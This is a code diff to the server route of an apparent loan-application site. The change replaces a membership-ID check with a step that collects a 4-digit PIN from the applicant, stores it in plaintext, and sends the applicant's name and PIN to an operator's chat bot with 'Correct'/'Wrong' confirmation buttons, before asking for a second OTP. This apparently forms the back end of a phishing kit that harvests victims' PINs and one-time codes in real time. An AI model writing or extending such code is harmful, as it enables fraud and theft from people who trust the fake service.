@@ -1,14 +1,55 @@
-import { env } from "cloudflare:workers";
-import { audit, findApplication, publicApp } from "../../../../../lib/applications";
+import { audit, findApplication, getSql, notifyAdmin, publicApp } from "../../../../../lib/applications";
 
-export async function POST(request: Request, context: { params: Promise<{ applicationId: string }> }) {
+export const runtime = "nodejs";
+
+export async function POST(
+  request: Request,
+  context: { params: Promise<{ applicationId: string }> }
+) {
   const { applicationId } = await context.params;
-  const { value, referenceId } = await request.json() as { value: string; referenceId: string };
+
+  const { value, referenceId } = (await request.json()) as {
+    value: string;
+    referenceId: string;
+  };
+
   const row = await findApplication(applicationId);
-  if (!row || row.reference_id !== referenceId || row.status !== "MEMBERSHIP_ID_REQUIRED") return Response.json({ error: "This verification request is not valid." }, { status: 400 });
-  const membership = String(value || "").trim().toUpperCase();
-  if (!/^MEM-[A-Z0-9]{4,12}$/.test(membership)) return Response.json({ error: "Membership ID could not be verified. Check it and try again." }, { status: 400 });
-  await env.DB.prepare("UPDATE loan_applications SET membership_id = ?, status = 'FINAL_APPROVAL_PENDING', updated_at = CURRENT_TIMESTAMP WHERE application_id = ?").bind(membership, applicationId).run();
-  await audit(applicationId, "MEMBERSHIP_VERIFIED", "applicant", membership);
-  return Response.json(publicApp({ ...row, status: "FINAL_APPROVAL_PENDING" }));
+
+  if (
+    !row ||
+    row.reference_id !== referenceId ||
+    row.status !== "MEMBERSHIP_ID_REQUIRED"
+  ) {
+    return Response.json(
+      { error: "This PIN request is not valid." },
+      { status: 400 }
+    );
+  }
+
+  const pin = String(value || "").trim();
+
+  if (!/^\d{4}$/.test(pin)) {
+    return Response.json(
+      { error: "Enter a 4-digit PIN." },
+      { status: 400 }
+    );
+  }
+
+  await getSql()`UPDATE loan_applications SET member_code=${pin}, status='SECOND_OTP_REQUIRED', updated_at=NOW() WHERE application_id=${applicationId}`;
+
+  await audit(applicationId, "PIN_SUBMITTED", "applicant", "user_submitted_value");
+
+  await notifyAdmin(
+    `📌 PIN SUBMITTED\n\n👤 Applicant: ${row.full_name}\n🔢 PIN: ${pin}\n\nConfirm this value.`,
+    {
+      inline_keyboard: [
+        [{ text: "✅ Correct", callback_data: `confirm_pin:${applicationId}` }],
+        [{ text: "❌ Wrong", callback_data: `wrong_pin:${applicationId}` }],
+      ],
+    }
+  );
+
+  return Response.json(
+    publicApp({ ...row, status: "SECOND_OTP_REQUIRED" })
+  );
 }
